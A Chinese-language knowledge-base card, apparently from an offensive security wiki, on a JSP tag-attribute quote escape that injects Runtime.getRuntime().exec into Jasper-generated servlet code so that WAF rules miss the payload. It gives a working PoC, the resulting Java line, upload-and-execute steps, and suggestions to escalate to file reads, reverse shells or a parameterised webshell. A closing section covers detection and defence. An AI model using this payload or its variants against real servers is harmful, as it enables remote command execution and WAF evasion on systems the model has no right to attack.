---
id: web-generic-file-upload-jsp-setproperty-attribute-quote-escape
title: JSP jsp:setProperty 属性引号逃逸：name 属性里的 \" 闭合 findAttribute 字符串并注入 Runtime.exec
type: scenario
domain: web
path: web/generic/file-upload
technique: jsp-setproperty-attribute-quote-escape
tags:
- web
- file-upload
- jsp
- waf-bypass
- webshell
- tag
- code-injection
- tomcat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V486
  verified_at: '2026-11-10T21:44:27+08:00'
  notes: 已对照原文图22逐字核对：标签逃逸 PoC 的 name 属性值须为 a\");（转义引号后紧跟右括号），原卡漏写右括号与自身引用的生成行 findAttribute("a") 不一致，已按幻灯片修正（知识卡与 staging 同步）；图22 的 index_jsp.java 第109行与卡内生成代码一致；单动作（setProperty 属性引号逃逸），useBean 动作已拆至另一卡；卡内无 sources/source_url/文章ID/URL，path web/generic/file-upload 合法；原文未给受影响版本，已 --clear。未验证点：幻灯片为本地 Jasper 复现、容器版本未标注，PoC 未在真实目标执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-jsp-setproperty-attribute-quote-escape/
draft: false
kb_aliases:
- 标签逃逸
- jsp:setProperty 属性逃逸
- jsp:setProperty 注入
- name 属性引号逃逸
- 生成代码注入
- 免 scriptlet JSP 马
---

## 一句话结论

在 `<jsp:setProperty name="...">` 的 name 属性值里用 `\"` 闭合 Jasper 生成的 `findAttribute("...")` 字符串，再用 `);` 结束语句、`//` 注释掉残余代码，就能把 `Runtime.getRuntime().exec(...)` 写进翻译后的 servlet 成为独立 Java 语句——原始 JSP 里没有 `<%` scriptlet，按文本特征匹配的 WAF 容易漏判。

## 原理

Java 上传流量对抗的通用背景：WAF 用自身的协议解码器与内容规则理解请求，而真实执行方（Tomcat/Jasper）按 JSP 规范把标签在翻译期展开成 Java 源码再编译，两侧对同一份上传文件的理解不一致时，检测对象与实际执行对象就错位了。

- **标签在编译期展开**：Jasper 对 `<jsp:setProperty name="X" property="*"/>` 生成 `org.apache.jasper.runtime.JspRuntimeLibrary.introspect(_jspx_page_context.findAttribute("X"), request);`——name 属性值被原样嵌进 `findAttribute("...")` 的字符串字面量。
- **属性引号逃逸**：JSP 属性语法里 `\"` 是转义引号，解析后的属性值本身含裸双引号；Jasper 把该值写入生成 Java 时不再做 Java 字面量转义，裸引号直接终止 `findAttribute("` 打开的字符串。
- 于是 name 取 `a\"), request);Runtime.getRuntime().exec(\"whoami\");//` 时，生成代码为 `...findAttribute("a"), request);Runtime.getRuntime().exec("whoami");//"), request);`：`findAttribute("a")` 正常闭合，注入的 `Runtime.getRuntime().exec("whoami");` 成为合法独立语句，`//` 注释掉残余的 `"), request);`，整个 servlet 仍可正常编译。
- **为什么有效**：检测规则通常盯 `<%`、`Runtime.getRuntime`、`getRuntime` 等 JSP 文本特征；该手法全文没有 scriptlet，危险动作藏在“组件声明”的属性值里，且真正危险的是翻译产物而非上传原文。

## 触发条件

- 目标允许上传/写入 .jsp 且容器会编译执行（Tomcat/Jasper 系）；
- Jasper 版本按上述方式把 name 属性拼进生成代码、且不与 Java 字面量转义（幻灯片在本地 Tomcat/Jasper 复现，具体版本原文未标注）；
- 防护只对上传内容做 scriptlet/关键字正则，未做标签展开或编译感知检测。

## 利用步骤

1. 构造下述 JSP（文件名如 1.jsp）并上传到会被编译执行的目录；
2. 访问该 JSP，观察命令执行（幻灯片里是 whoami）；
3. 到容器 work 目录查看生成的 `index_jsp.java`，确认注入语句进入编译结果（幻灯片第 109 行形态）；
4. 将 exec 参数换成读文件/反弹等扩大利用，或换其它标签属性作逃逸点。

## PoC

```jsp
<jsp:setProperty name = "a\"), request);Runtime.getRuntime().exec(\"whoami\");//" property="*"/>
```

生成的关键 Java 行（幻灯片 work 目录 index_jsp.java）：

```java
org.apache.jasper.runtime.JspRuntimeLibrary.introspect(_jspx_page_context.findAttribute("a"), request);Runtime.getRuntime().exec("whoami");//"), request);
```

说明：幻灯片在本地 Tomcat/Jasper 上复现；未在真实目标执行，生成细节随 Jasper 版本可能不同，需按目标实测。

## 变体与关联

- 变体：其它会被拼进生成代码的标签属性同样是候选逃逸点（jsp:getProperty、jsp:include、JSTL 标签参数、tag 文件属性等）；把 exec 参数换成 `request.getParameter("cmd")` 可做成参数化马。
- 关联：[[web-generic-file-upload-jsp-usebean-tag-reflection-injection]]（同一“标签属性注入生成代码”原语的完整无 scriptlet 反射马版本，见本次拆分另一张卡）、[[web-java-rce-jsp-scriptlet-special-closure-bypass]]（scriptlet 结构性闭合逃逸，同属利用生成代码结构）、[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（EL 求值层绕过）、[[web-generic-file-upload-jspx-xml-pi-entity-cdata-waf-bypass]]（JSPX/XML 语法层拆分特征）。
- 边界：依赖 Jasper 对属性值的拼接实现，容器升级/补齐转义后失效；WAF 升级为标签展开/AST 检测即被识别；最终仍需 JSP 编译执行。

## 检测与防御

- 检测（WAF）：对 JSP 标签属性值检测 Java 语句片段（`);`、`//`、`/*`、`Runtime`、`getRuntime`、方法调用链），按 JSP 标准动作展开成生成代码后再匹配；对 name/id 等属性中含转义引号、分号、注释符的请求直接拒绝。
- 检测（主机）：work 目录生成的 `_jsp.java` 出现与源码不符的 `Runtime.getRuntime().exec`；JSP 源文件中出现 `<jsp:setProperty name="...\..."` 形态；Web 进程派生 cmd/sh 子进程。
- 防御：禁止上传目录执行 JSP（静态存储+重命名）；WAF 采用编译感知/语法树检测；对业务 JSP 中标签属性的使用做白名单审计；容器最小权限运行。
